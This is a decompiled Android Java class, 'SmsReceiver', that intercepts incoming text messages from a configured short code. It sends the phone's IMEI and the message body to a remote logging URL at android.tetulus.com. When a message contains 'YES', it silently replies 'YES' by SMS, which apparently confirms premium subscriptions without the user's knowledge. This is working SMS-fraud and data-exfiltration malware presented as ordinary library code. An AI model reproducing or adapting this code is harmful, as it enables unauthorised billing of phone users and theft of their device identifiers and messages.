package shared.library.us;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "GLM_SMS_RECEIVER";
    /* access modifiers changed from: private */
    public Context ctx;
    private SmsMessage[] smsMsg;

    public void onReceive(Context context, Intent intent) {
        String str = "YES";
        String str2 = TAG;
        str = TAG;
        Log.i(str2, "onReceive");
        try {
            this.ctx = context;
            if (intent.getExtras() != null) {
                Log.i(TAG, "Bundle not null");
                this.smsMsg = getMessagesFromIntent(intent);
                for (int i = 0; i < this.smsMsg.length; i++) {
                    String sender = this.smsMsg[i].getOriginatingAddress();
                    final String message = this.smsMsg[i].getMessageBody();
                    if (sender.equals(Parameters.csc)) {
                        if (Parameters.debug.equals("1")) {
                            new Thread() {
                                public void run() {
                                    try {
                                        HttpPosting.postData2("http://android.tetulus.com/atp-log.php?imei=" + ((TelephonyManager) SmsReceiver.this.ctx.getSystemService("phone")).getDeviceId() + "&pid=" + SmsReceiver.this.ctx.getString(2130968579) + "&type=smsreciever&log=" + URLEncoder.encode(message, "UTF-8"));
                                    } catch (UnsupportedEncodingException e) {
                                        e.printStackTrace();
                                    }
                                }
                            }.start();
                        }
                        if (message.contains("YES")) {
                            Parameters.setAnalytics(this.ctx, "Visit_PIN");
                            try {
                                SmsManager.getDefault().sendTextMessage(Parameters.csc, null, "YES", null, null);
                                Log.i(TAG, "REPLY WITH YES MO SENT");
                            } catch (Exception e) {
                            }
                            Parameters.setAnalytics(this.ctx, "Visit_PIN_Success");
                        }
                    }
                }
            }
        } catch (Exception e2) {
        }
    }

    private SmsMessage[] getMessagesFromIntent(Intent intent) {
        SmsMessage[] receivedSMS = null;
        try {
            Object[] pdus = (Object[]) intent.getExtras().get("pdus");
            receivedSMS = new SmsMessage[pdus.length];
            for (int n = 0; n < pdus.length; n++) {
                receivedSMS[n] = SmsMessage.createFromPdu(pdus[n]);
            }
        } catch (Exception e) {
            Log.e(TAG, "fail", e);
        }
        return receivedSMS;
    }
}
